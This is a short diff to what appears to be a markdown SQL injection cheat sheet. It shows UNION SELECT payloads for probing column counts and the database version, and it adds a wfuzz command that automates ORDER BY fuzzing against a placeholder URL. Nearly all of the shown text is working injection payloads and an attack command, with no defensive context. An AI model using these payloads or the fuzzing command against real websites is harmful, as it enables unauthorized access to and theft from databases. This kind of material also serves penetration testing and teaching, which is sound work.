@@ -17,6 +17,10 @@ Repeat this input until you get a response from the server
     ' UNION SELECT 1,2,3,4,5 #
     ' UNION SELECT 1,2,3,4,5,6 #
 
+Automated
+
+    wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"
+
 ### 3) Find DB Version
 
     ' UNION SELECT 1,2,3,4,5,@@version #
